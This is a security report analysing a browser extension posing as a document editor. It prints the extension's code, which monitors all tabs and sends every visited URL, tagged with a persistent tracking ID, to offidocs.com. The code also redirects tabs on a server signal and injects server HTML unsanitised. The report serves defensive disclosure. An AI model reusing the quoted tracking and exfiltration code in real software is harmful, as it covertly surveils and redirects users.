# Vulnerability Report: OpenOffice Writer online for Word documents

## Extension Metadata
- **Extension ID**: flfhkellafphdlcigippmenebkodkina
- **Extension Name**: OpenOffice Writer online for Word documents
- **Version**: 2.7.1
- **User Count**: ~50,000 users
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-07

## Executive Summary

This extension exhibits **HIGH RISK** behavior through aggressive browsing surveillance and privacy violations. The extension monitors ALL tab activity, transmits complete browsing history to offidocs.com servers, and implements automatic tab hijacking functionality. While the extension presents itself as an office document editor, its core functionality includes comprehensive user tracking that extends far beyond document editing requirements.

**Primary Concerns:**
1. **Universal browsing surveillance** - tracks every URL visited across all tabs
2. **Automatic URL transmission** - sends browsing history to remote servers
3. **Tab hijacking** - can forcibly redirect user tabs based on server responses
4. **Inadequate user disclosure** - tracking behavior not clearly communicated
5. **innerHTML injection** - potential XSS vulnerabilities in popup interface

## Vulnerability Details

### 1. Universal Browsing History Surveillance
**Severity**: HIGH
**Files**: `websecure.js` (lines 5-32)
**Verdict**: CONFIRMED MALICIOUS

**Evidence**:
```javascript
function getTabInfo(tabId) {
    chrome.tabs.get(tabId, function(tab) {
        if ( ( tab.url.indexOf("offidocs") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lastUrl != tab.url) )  {
            urlx =  tab.url;
            extractopenofficewriter(urlx);
            lastUrl = tab.url;
        }
    });
}

chrome.tabs.onActivated.addListener(function(activeInfo) {
    activeTabId = activeInfo.tabId;
    getTabInfo(activeTabId);
});

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    getTabInfo(tabId);
});
```

**Analysis**:
- Extension monitors EVERY tab activation and update event
- Captures and processes URLs from ALL websites (excluding offidocs.com itself)
- No legitimate document editing purpose requires universal tab monitoring
- Transmits URLs to remote servers for processing (see vulnerability #2)

### 2. Remote URL Transmission & Server-Side Processing
**Severity**: HIGH
**Files**: `websecure.js` (lines 60-118)
**Verdict**: CONFIRMED PRIVACY VIOLATION

**Evidence**:
```javascript
async function extractopenofficewriter(urlxx) {
    // Generate/retrieve user tracking ID
    var username = "";
    if ( datax.username ) {
        username = datax.username;
    }
    else {
        username = "" + randomString(10) + "".toLowerCase();
        datax.username = username;
    }

    // First server call to get service ID
    let response = await fetch('https://www.offidocs.com/media/system/app/resetlool.php?username=' + username + '&urlpathx=/community/user.php');
    if (response.status === 200) {
        let data = await response.text();
        servicexx = data;
    }

    // Second server call - transmits every visited URL
    let cfgv = await fetch('https://www.offidocs.com/media/system/app/checkdownloadowriterx_2_nav.php?filepath=' + bin2hex(urlxx) + '&hex=1&u=' + un + "&s=" + servicexx);

    if (cfgv.status === 200) {
        let fbv = await cfgv.text();
        var nbv = fbv;
        // Server can trigger tab hijacking with "302" response
        if ( nbv.indexOf("302") !== -1 ) {
            var ybv = 'https://www.offidocs.com/media/system/app/view_edit_officedoc_nav.php?filepath=' + bin2hex(urlxx) + '&u=' + un;
            chrome.tabs.update(chrome.tabs.getCurrent().id, {url: ybv});
        }
    }
}
```

**Analysis**:
- Every visited URL is hex-encoded and transmitted to offidocs.com servers
- Creates persistent user tracking ID stored in chrome.storage
- Server receives complete browsing history linked to unique user ID
- No user consent mechanism for URL tracking
- Two-stage server communication suggests sophisticated tracking infrastructure

### 3. Automatic Tab Hijacking
**Severity**: HIGH
**Files**: `websecure.js` (lines 110-114)
**Verdict**: CONFIRMED MALICIOUS

**Evidence**:
```javascript
if ( nbv.indexOf("302") !== -1 ) {
    var ybv = 'https://www.offidocs.com/media/system/app/view_edit_officedoc_nav.php?filepath=' + bin2hex(urlxx) + '&u=' + un;
    chrome.tabs.update(chrome.tabs.getCurrent().id, {url: ybv});
}
```

**Analysis**:
- Server controls whether to hijack user's current tab
- When server responds with "302", extension forcibly redirects user's active tab
- No user confirmation or notification before redirection
- Allows remote server to control user's browsing experience
- Could be weaponized for phishing, malvertising, or forced redirects

### 4. Inadequate User Consent & Disclosure
**Severity**: HIGH
**Files**: `popup.js` (lines 35-44), `manifest.json`
**Verdict**: CONFIRMED PRIVACY VIOLATION

**Evidence**:
```javascript
// Toggle exists but defaults to ENABLED
if ( offidocscloud == "1")  {
    document.getElementById("offidocscloud").checked = true;
}
else {
    document.getElementById("offidocscloud").checked = false;
}
```

**Manifest Permissions**:
```json
"permissions": [
    "storage",
    "tabs"
]
```

**Analysis**:
- Tracking feature defaults to enabled ("offidocscloud": "1")
- Option to disable exists but is buried in UI as "Detect files" checkbox
- Label "Detect files" significantly understates actual behavior (universal URL tracking)
- No explicit user consent flow on first install
- `tabs` permission allows access to all browsing activity but not disclosed clearly
- Violates reasonable user expectations for document editing extension

### 5. innerHTML Injection Vulnerabilities
**Severity**: MEDIUM
**Files**: `popup.js` (lines 73, 77, 83, 102-103, 107, 113)
**Verdict**: CONFIRMED VULNERABILITY

**Evidence**:
```javascript
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', 'https://www.offidocs.com/media/system/app/checkdownloadowriterr_2_nav.php?u=' + username, true);
xhr1.onload = function (e) {
    if (xhr1.readyState === 4) {
        if (xhr1.status === 200) {
            var response1 = xhr1.responseText;
            listfilesx = document.getElementById('listfilesx');
            listfilesx.innerHTML = "<p>List of files detected in this webpage. Click to edit:</p> " + response1;
        }
    }
};
```

**Analysis**:
- Server response directly injected into DOM via innerHTML without sanitization
- No Content Security Policy defined in manifest to mitigate XSS
- If offidocs.com servers compromised, could deliver XSS payloads to all users
- Multiple injection points throughout popup.js (lines 73, 102-103, etc.)
- MV3 provides some protection but innerHTML should still be avoided

### 6. Persistent User Tracking Infrastructure
**Severity**: MEDIUM
**Files**: `websecure.js` (lines 37-43), `popup.js` (lines 16-34)
**Verdict**: CONFIRMED TRACKING

**Evidence**:
```javascript
// Generate unique tracking ID
username = "" + randomString(10) + "".toLowerCase();
chrome.storage.sync.set({'username': username.toLowerCase()}, function() { });

// Also stored in local storage
datax.username = username;
await chrome.storage.local.set(data);
```

**Analysis**:
- Creates 10-character random tracking ID on first use
- Stored in both sync and local storage for persistence
- Used as unique identifier in all server communications
- Enables long-term user profiling across browsing sessions
- No mechanism for users to reset or clear tracking ID

### 7. Excessive Permissions for Stated Functionality
**Severity**: MEDIUM
**Files**: `manifest.json`
**Verdict**: CONFIRMED OVERREACH

**Analysis**:
- `tabs` permission grants access to ALL tab URLs and activity
- Document editor only needs host permissions for specific domains
- No content_scripts defined, yet monitors all browsing
- MV3 service worker has unlimited network access
- Could achieve stated functionality with far more limited permissions

## False Positive Analysis

| Finding | Assessment | Reason |
|---------|------------|--------|
| jQuery innerHTML usage | FALSE POSITIVE | Standard jQuery DOM manipulation in jquery.min.js/jquery-3.3.1.min.js libraries |
| elfinder.min.js complexity | FALSE POSITIVE | Legitimate file manager library (Studio-42/elFinder) |
| XMLHttpRequest in libraries | FALSE POSITIVE | Standard AJAX functionality in jQuery |
| Function() in jquery.min.js | FALSE POSITIVE | JSON parsing in legacy jQuery code |
| addEventListener in libraries | FALSE POSITIVE | Standard event handling in jQuery/UI libraries |

## API Endpoints & Data Flow

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| `offidocs.com/media/system/app/resetlool.php` | Get service ID | username, urlpathx | Medium |
| `offidocs.com/media/system/app/checkdownloadowriterx_2_nav.php` | Process visited URL | hex-encoded URL, username, service ID | **HIGH** |
| `offidocs.com/media/system/app/view_edit_officedoc_nav.php` | Redirect target | hex-encoded URL, username | Medium |
| `offidocs.com/media/system/app/checkdownloadowriterr_2_nav.php` | List user files | username | Low |
| `offidocs.com/community/user.php` | User profile | username | Low |
| `offidocs.com/phpextensions/connector.php` | File manager backend | username, service ID | Low |

## Data Flow Summary

```
User visits ANY webpage
    ↓
chrome.tabs.onActivated/onUpdated fires
    ↓
websecure.js captures URL
    ↓
URL hex-encoded + sent to offidocs.com with tracking ID
    ↓
Server processes URL, decides whether to hijack tab
    ↓
If server returns "302": tab forcibly redirected to offidocs.com
    ↓
Complete browsing history stored server-side linked to tracking ID
```

**Privacy Impact**:
- Complete browsing history transmitted to third-party servers
- No encryption beyond HTTPS
- No data retention policy disclosed
- No user control over collected data
- Tracking ID enables long-term profiling

## Mitigation Recommendations

**For Users**:
1. **UNINSTALL IMMEDIATELY** if privacy is a concern
2. If keeping extension: Disable "Detect files" checkbox in popup
3. Note: Disabling feature still leaves tracking code active, just prevents execution

**For Developer** (if acting in good faith):
1. Remove universal tab monitoring - only monitor tabs with office documents
2. Implement explicit opt-in consent flow on first install
3. Use host_permissions instead of tabs permission
4. Add clear privacy policy explaining URL collection
5. Implement user data deletion mechanism
6. Remove automatic tab hijacking functionality
7. Add CSP to manifest
8. Replace innerHTML with textContent or DOMPurify
9. Minimize server-side URL processing

## Technical Indicators

**Obfuscation Level**: Low (readable code, clear variable names)
**Code Quality**: Medium (functional but privacy-invasive design)
**Update Frequency**: Unknown (version 2.7.1)
**External Dependencies**: jQuery 3.3.1, jQuery UI, elFinder library
**Network Activity**: High (multiple server requests per page view)
**Resource Usage**: Medium (service worker + popup monitoring)

## Conclusion

**OVERALL RISK LEVEL**: **HIGH**

This extension implements comprehensive browsing surveillance under the guise of document editing functionality. While the stated purpose (editing Office documents online) is legitimate, the implementation includes:

- **Universal URL tracking** across all browsing activity
- **Remote transmission** of browsing history to third-party servers
- **Automatic tab hijacking** controlled by remote server
- **Inadequate user disclosure** of tracking behavior
- **No meaningful user control** over data collection (defaults to enabled)

The extension violates user privacy expectations and Chrome Web Store policies regarding disclosure and consent for data collection. The tab hijacking mechanism could be weaponized for malicious purposes if the backend servers are compromised or if the developer acts maliciously.

**Recommendation**: Users concerned about privacy should remove this extension. The tracking functionality far exceeds what is necessary for document editing and represents a significant privacy risk.

---

**Report Generated**: 2026-02-07
**Analysis Method**: Static code analysis + manifest review
**Confidence Level**: High (clear code, confirmed behavior patterns)
